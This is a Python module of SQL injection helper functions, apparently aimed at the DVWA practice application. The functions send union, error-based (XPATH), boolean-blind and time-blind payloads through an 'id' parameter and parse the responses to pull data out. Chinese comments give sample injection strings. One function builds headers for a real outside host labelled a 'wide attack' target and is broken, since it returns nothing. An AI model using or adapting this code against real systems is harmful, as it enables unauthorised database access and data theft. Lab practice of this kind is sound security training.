import requests
import re
from colorama import init


def sql_union_inject1(sql, url, headers):
    str = f'?id={sql}&Submit=Submit#'
    printf("正在猜解:" + url + str)
    recv = requests.get(url + str, headers=headers).text
    if recv.find("Surname") != -1:
        return 1
    else:
        return 0


def sql_union_inject(sql, url, headers):
    str = f'?id={sql}&Submit=Submit#'
    printf("正在猜解:" + url + str)
    recv = requests.get(url + str, headers=headers).text
    if recv.find("Unknown") == -1:
        return recv
    else:
        return '0'


def judge_sql_time_inject(sql, url, headers):  # 返回判断，盲注
    '''
    :param sql:字符型注入或者数字型注入，字符型注入为 1' or '1'='1,1' and '1'='2;数字型
    注入为1 and 1=1,1 and 1=2;
    :return:
    '''
    str = f'?id={sql}&Submit=Submit#'
    printf("正在猜解:" + url + str)
    recv = requests.get(url + str, headers=headers)
    # r = requests.get(url_get)
    sec = recv.elapsed.seconds
    try:
        if sec >= 2:
            return 1
        else:
            return 0
    except:
        return 0


def sql_error_inject(sql, url, headers):
    str = f'?id={sql}&Submit=Submit#'
    printf("正在猜解:" + url + str)
    recv = requests.get(url + str, headers=headers).text
    if recv.find('XPATH syntax error') != -1:
        r = recv.split('~')[1].split('\'')[0]
        return r
    else:
        return '0'


def judge_sql_inject(sql, url, headers):  # 返回判断，盲注
    '''
    :param sql:字符型注入或者数字型注入，字符型注入为 1' or '1'='1,1' and '1'='2;数字型
    注入为1 and 1=1,1 and 1=2;
    :return:
    '''
    str = f'?id={sql}&Submit=Submit#'
    printf("正在猜解:" + url + str)
    recv = requests.get(url + str, headers=headers).text
    try:
        if 'exists' in re.search('User ID.*?database', recv).group():
            return 1
        else:
            return 0
    except:
        return 0


def get_header(url, cookie):  # 生成头部信息
    ip = re.search('\d{1,3}\.\d{1,3}\.\d{1,3}.\d{1,3}', url).group()
    headers = {
        'Host': f'{ip}',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Referer': f'{url}',
        'Connection': 'close',
        'Cookie': f'security=low; PHPSESSID={cookie}',
        'Upgrade-Insecure-Requests': '1'
    }
    return headers, ip


def get_wide_attack_header(url):
    headers = {
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "Accept - Encoding": "gzip, deflate",
        "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6",
        "Cache-Control": "max-age=0",
        "Connection": "keep-alive",
        "Host": "sql.cjxno1.love",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36 Edg/90.0.818.62"
    }


def printf(str):
    print("\033[1;31m[INFO]\033[0m" + str)
